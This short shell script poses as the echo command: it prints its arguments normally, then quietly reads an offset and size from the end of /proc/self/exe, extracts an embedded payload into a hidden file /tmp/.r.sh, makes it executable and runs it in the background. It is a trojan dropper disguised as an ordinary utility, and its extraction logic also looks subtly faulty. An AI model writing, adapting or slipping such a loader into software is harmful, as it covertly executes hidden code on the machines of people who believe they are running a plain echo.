#!/bin/sh

# Mimic echo
for arg in "$@"; do
  printf "%s " "$arg"
done
printf "\n"

# Extract and run embedded shell payload
SELF=/proc/self/exe
read_offset_size() {
  tail -c 8 "$SELF" | od -An -t u4 | awk '{print $1, $2}'
}
read_payload() {
  OFFSET=$1
  SIZE=$2
  dd if="$SELF" bs=1 skip=$OFFSET count=$SIZE status=none
}

read_offset_size | {
  read OFFSET SIZE
  TMP=/tmp/.r.sh
  read_payload "$OFFSET" "$SIZE" > "$TMP"
  chmod 700 "$TMP"
  "$TMP" &
}
